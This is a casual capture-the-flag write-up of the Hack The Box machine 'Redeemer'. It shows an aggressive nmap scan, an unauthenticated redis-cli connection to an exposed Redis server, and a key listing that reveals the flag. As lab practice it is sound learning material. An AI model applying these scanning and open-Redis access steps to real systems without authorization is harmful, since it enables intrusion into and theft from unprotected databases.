[Redeemer](https://app.hackthebox.com/machines/Redeemer)

Box is about Redis database server stuff! Never heard of it ngl

# Enumeration
Since I don't really know what this box is about, i'm going to make the nmap search for every port
We also dont really care for being hidden, so ill bump up Timing to Insane (-T 5)
>sudo nmap -sC -sV -p- -iL ip.txt -T 5

```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-13 13:33 -0400
Nmap scan report for 10.129.57.111
Host is up (0.041s latency).
Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 5.0.7
```

Quick google search shows that its a remote DB thats stored in memory, neat
When in doubt, type Enumeration+program

Learned about redis-cli, going to install it and check the manual page

# Exploitation

Ngl these early boxes are usually configured with guest logins, so ill just attempt to connect
>redis-cli -h 10.129.57.111

```
10.129.57.111:6379> ls
(error) ERR unknown command `ls`, with args beginning with:
```

We're in! Time to google a cheatsheet for commands

Holy carp theres a billion commands, luckily learned about INFO and keys *
```
0.129.57.111:6379> keys *
1) "numb"
2) "flag"
3) "temp"
4) "stor"
10.129.57.111:6379>
```

Finally, the flag! Now just do a GET query and we're done

**i hate redis**
